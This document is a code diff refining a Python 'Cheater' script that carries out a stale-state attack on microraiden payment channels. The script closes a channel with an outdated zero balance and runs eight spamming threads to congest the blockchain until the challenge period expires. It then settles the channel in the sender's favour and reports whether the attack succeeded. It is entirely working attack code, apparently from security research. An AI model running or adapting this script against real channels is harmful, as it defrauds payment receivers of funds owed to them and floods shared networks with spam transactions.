@@ -1,10 +1,10 @@
 #!/usr/bin/python
 
 import logging
+import time
 import datetime
-
+from threading import Thread
 from microraiden import Client
-from microraiden.stale_state_attack.spamming import SpamManager
 from microraiden.stale_state_attack.utils import (
     send_payment,
     create_close_channel_transaction,
@@ -12,7 +12,9 @@ from microraiden.stale_state_attack.utils import (
     wait_for_open,
     wait_for_close,
     wait_for_settle,
+    wait_for_block_generation,
 )
+from microraiden.stale_state_attack.spamming.spammer import Spammer
 
 
 class Cheater():
@@ -39,14 +41,14 @@ class Cheater():
         self.client = Client(private_key=private_key, key_password_path=None,
                              channel_manager_address=channel_manager_address)
 
+        self.challenge_period = self.client.context.channel_manager.call().challenge_period()
+
         # Initialize spam manager
-        self.spam_manager = SpamManager(
-            web3=web3,
+        self.spammer = Spammer(
             private_key=private_key,
             number_threads=8,
-            nonce_offset=1,  # for close request
-            challenge_period=self.client.context.channel_manager.call().challenge_period(),
-            create_settle_transaction=lambda nonce: self.create_settle_transaction(nonce),
+            target_block=web3.eth.blockNumber + self.challenge_period,
+            nonce_offset=1,  # for close transaction
         )
 
     def start(self):
@@ -62,11 +64,14 @@ class Cheater():
         # Send an off-chain payment
         self.send_offchain_payment(amount=1)
 
+        # Update the target block because it's possible that many new blocks have
+        # already been generated until now.
+        self.spammer.update_target_block(self.web3.eth.blockNumber + self.challenge_period)
+
         # Wait until minimum number of signed spam transactions are in queue
-        if (len(self.spam_manager.queued_transactions()) < self.spam_manager.desired_pending_txs()):
-            self.logger.info(
-                'Waiting for full transaction queue ({} transactions)...'.format(self.spam_manager.desired_pending_txs()))
-            self.spam_manager.wait_for_full_tx_queue()
+        self.logger.info('Waiting for full transaction queue ({} transactions)...'.format(
+            self.spammer.manager.desired_queued_txs()))
+        self.spammer.manager.wait_for_full_tx_queue()
 
         # Start stale state attack
         self.state_stale_attack(balance=0)
@@ -107,14 +112,15 @@ class Cheater():
         period is reached, a settle request is sent.
         '''
         # Create close channel transaction
-        close_tx = create_close_channel_transaction(channel=self.channel, balance=balance)
+        close_tx = create_close_channel_transaction(
+            channel=self.channel, balance=balance)
 
         # Send close channel transaction
-        self.logger.info('Sending close transaction...')
-        self.web3.eth.sendRawTransaction(close_tx)
+        close_tx_hash = self.web3.eth.sendRawTransaction(close_tx)
+        self.logger.info('Sent close transaction (tx={})'.format(close_tx_hash.hex()))
 
         # Start transaction spamming with 8 threads
-        self.spam_manager.start()
+        self.spammer.start()
 
         # Wait for channel to be closed
         closed_event = wait_for_close(self.channel)
@@ -124,15 +130,21 @@ class Cheater():
         _, _, settle_block, _, _ = self.channel.core.channel_manager.call().getChannelInfo(
             self.channel.sender, self.channel.receiver, self.channel.block
         )
-        # Update target block for spamming thread
-        self.spam_manager.update_target_block(settle_block)
+
+        # Update target block for spamming thread.
+        # NOTE The addition of 5 blocks ensures that the congestion is long enough to
+        # let the sender's settle transaction be parsed before the receiver's one.
+        self.spammer.update_target_block(settle_block + 5)
+
+        settle_thread = Thread(target=self.settle_after_challenge_period, args=(settle_block,))
+        settle_thread.start()
 
         # Wait for channel to be settled
         settled_event = wait_for_settle(self.channel)
         self.logger.info('Channel settled at block #{}'.format(settled_event['blockNumber']))
 
         # Stop the spamming
-        self.spam_manager.stop()
+        self.spammer.stop()
 
         # Get the settle transaction
         settle_tx_hash = settled_event['transactionHash']
@@ -146,14 +158,20 @@ class Cheater():
 
         # Determine, if sender or receiver settled the channel
         settled_by = settle_tx['from']
+        attack_result_str = None
         if (settled_by == self.channel.receiver):
+            attack_result_str = 'ATTACK FAILED'
             settled_by = 'Receiver'
         if (settled_by == self.channel.core.address):
+            attack_result_str = 'ATTACK SUCCEEDED'
             settled_by = 'Sender'
 
         # Print result
         print()
         print('-----------------------------------------------------------')
+        if attack_result_str is not None:
+            print(attack_result_str)
+            print()
         print('Sender \t\t {}'.format(self.channel.core.address))
         print('Receiver \t {}'.format(self.channel.receiver))
         # print('OPENED block \t #{}'.format(channel.block))
@@ -162,12 +180,26 @@ class Cheater():
         print()
         print('Settled by \t\t {}'.format(settled_by))
         print('Settle balance \t\t {}'.format(settled_event['args']['_balance']))
-        print('Spam transactions \t {}'.format(self.spam_manager.number_sent_transactions()))
+        print('Spam transactions \t {}'.format(self.spammer.manager.tx_sent_counter))
         print('Elapsed time \t\t {}'.format(str(elapsed_time)))
         print(
             'CLOSE->SETTLE \t\t {}'.format(settled_event['blockNumber'] - closed_event['blockNumber']))
         print('-----------------------------------------------------------')
         print()
 
-    def create_settle_transaction(self, nonce):
-        return create_settle_channel_transaction(self.channel, nonce)
+    def settle_after_challenge_period(self, settle_block):
+        # Wait until challenge period passed
+        self.logger.info('Waiting until challenge period is over...')
+        wait_for_block_generation(self.web3, settle_block)
+        self.logger.info('Challenge period is over.')
+
+        # Create settle transaction
+        settle_nonce = self.spammer.manager.reserve_nonce()
+        settle_tx = create_settle_channel_transaction(self.channel, settle_nonce)
+
+        try:
+            # Send settle transaction
+            tx_hash = self.web3.eth.sendRawTransaction(settle_tx)
+            self.logger.info('Sent settle transaction (tx={})'.format(tx_hash.hex()))
+        except Exception as e:
+            self.logger.error('Sending settle transaction failed: {}'.format(e))
